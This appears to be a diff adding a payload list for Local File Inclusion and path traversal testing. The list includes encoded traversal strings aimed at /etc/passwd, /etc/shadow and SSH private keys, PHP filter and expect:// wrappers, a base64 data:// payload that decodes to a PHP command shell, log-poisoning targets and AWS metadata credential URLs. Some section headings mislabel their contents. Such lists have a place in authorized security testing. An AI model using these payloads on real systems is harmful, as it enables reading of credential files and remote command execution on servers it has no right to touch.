@@ -1,0 +1,111 @@
+# Local File Inclusion (LFI) - Path Traversal
+# Basic payloads (detection)
+../
+../../
+../../../
+../../../../etc/passwd
+
+# PHP wrapper payloads (no filters)
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+/proc/self/cmdline
+/proc/version
+/etc/hosts
+/etc/resolv.conf
+
+# Depth variation
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# Encoding bypass - URL encoding
+..%2F
+..%252F
+..%c0%af
+..%255c
+%2e%2e%2f
+
+# Double encoding
+..%252F..%252F..%252Fetc%252Fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+# Case variation (Windows)
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+
+# Null byte bypass (PHP <5.3.4)
+../../../etc/passwd%00
+../../../etc/passwd%00.php
+../../../etc/passwd%00.jpg
+
+# Backslash bypass
+..\..\..\etc\passwd
+..\\..\\..\\etc\\passwd
+
+# Filter bypass - UNC path (Windows)
+\\.\c:\windows\win.ini
+\\?\c:\windows\system32\drivers\etc\hosts
+
+# Junk bytes bypass
+../../../etc/passwd/./
+../../../etc/passwd/...
+../../../etc/passwd?
+
+# Dot truncation (IIS)
+/etc/passwd....
+/etc/passwd::$DATA
+
+# Obfuscation
+..%5c..%5c..%5cwindows%5cwin.ini
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+# PHP filter chains (data extraction)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.quoted-printable-encode/resource=config.php
+
+# PHP expect:// protocol
+expect://whoami
+expect://id
+
+# PHP data:// protocol
+data://text/plain,<?php phpinfo(); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B
+
+# Log poisoning setup (Apache access log)
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+
+# Session files
+/var/lib/php/sessions/sess_*
+/tmp/php_session_*
+/var/tmp/php_session_*
+
+# SSH keys (if readable)
+/home/user/.ssh/id_rsa
+/root/.ssh/authorized_keys
+
+# Web application config files
+web.config
+.htaccess
+web.xml
+appconfig.xml
+
+# Cloud metadata (AWS)
+/proc/self/environ (AWS_ACCESS_KEY_ID)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Windows paths
+C:\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+C:\boot.ini
+C:\windows\win.ini
+
+# Combined payloads
+../../../var/www/html/../../../etc/passwd
+/var/www/html/../../../../../../etc/passwd
